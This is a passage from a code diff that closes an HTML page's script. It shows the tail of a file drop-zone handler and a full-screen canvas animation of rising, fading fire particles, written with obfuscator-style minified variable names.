+                r.readAsDataURL(this.files[0]);
+                _0xX('dropZone').classList.remove('invalid')
+            }
+        };
+
+        // FIRE CANVAS LOGIC
+        const _0xH=_0xX('fireCanvas'),_0xG=_0xH.getContext('2d');let _0xF=[];const _0xE=()=>(_0xH.width=window.innerWidth,_0xH.height=window.innerHeight);window.onresize=_0xE;_0xE();
+        class _0xD{constructor(){this.x=Math.random()*_0xH.width;this.y=_0xH.height+100;this.sY=Math.random()*3+1;this.sX=(Math.random()-0.5)*2;this.sz=Math.random()*25+5;this.l=1;this.d=Math.random()*0.01+0.003;this.h=Math.random()<.2?200:Math.random()*40+10}u(){this.y-=this.sY;this.x+=this.sX;this.l-=this.d}dr(){_0xG.globalCompositeOperation='lighter';_0xG.fillStyle=`hsla(${this.h},100%,50%,${this.l*0.6})`;_0xG.beginPath();_0xG.arc(this.x,this.y,this.sz,0,Math.PI*2);_0xG.fill()}}
+        function _0xC(){_0xG.clearRect(0,0,_0xH.width,_0xH.height);if(_0xF.length<150)_0xF.push(new _0xD);for(let i=_0xF.length-1;i>=0;i--){_0xF[i].u();_0xF[i].dr();if(_0xF[i].l<=0||_0xF[i].y<-50)_0xF.splice(i,1)}requestAnimationFrame(_0xC)}_0xC();
+    })(window,document);
+    </script>
 </body>
 </html>
